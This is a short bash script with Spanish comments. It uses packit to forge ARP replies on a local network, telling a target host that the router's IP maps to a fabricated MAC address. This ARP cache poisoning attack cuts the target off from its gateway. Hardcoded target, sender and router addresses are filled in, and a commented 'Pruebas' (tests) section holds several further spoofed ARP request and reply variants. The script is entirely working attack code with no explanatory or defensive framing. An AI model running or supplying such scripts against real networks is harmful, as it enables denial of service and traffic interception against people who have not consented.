#!/bin/bash

IF='wlp1s8'

DST='24:ab:81:4f:4b:02'
DIP='192.168.1.37'

SRC='00:11:95:14:72:60'
SIP='192.168.1.39'

ROU='64:68:0c:4a:49:15'
RIP='192.168.1.1'

BC='FF:FF:FF:FF:FF:FF'
Z='00:00:00:00:00:00'

RND='DE:FE:CA:CE:BA:D0'

#El router para ti es una mac inventada
packit -t arp -A 2 -i $IF	\
	-e $SRC -E $DST		\
	-x $RIP -X $RND		\
	-y $DIP -Y $DST


############ Pruebas ###########

#packit -t arp -A 1 -i $IF -e $DST -E $BC -x $DIP -X $DST -y $SIP -Y $BC

#packit -t arp -A 2 -i $IF -e $ROU -E $DST -x $DIP -X $SRC -y $DIP -Y $DST

#Quien soy? 
#packit -t arp -A 1 -i $IF	\
#	-e $SRC -E $BC		\
#	-x $RIP -X $ROU		\
#	-y $SIP -Y $Z

#Tu ip es inventada
#packit -t arp -A 2 -i $IF	\
#	-e $RND -E $BC		\
#	-x $DIP -X $RND		\
#	-y $DIP -Y $DST

#packit -t arp -A 2 -i $IF -e $ROU -E $SRC -x $RIP -X $ROU -y $SIP -Y $SRC

#packit -i $IF -t arp -A 2 -x
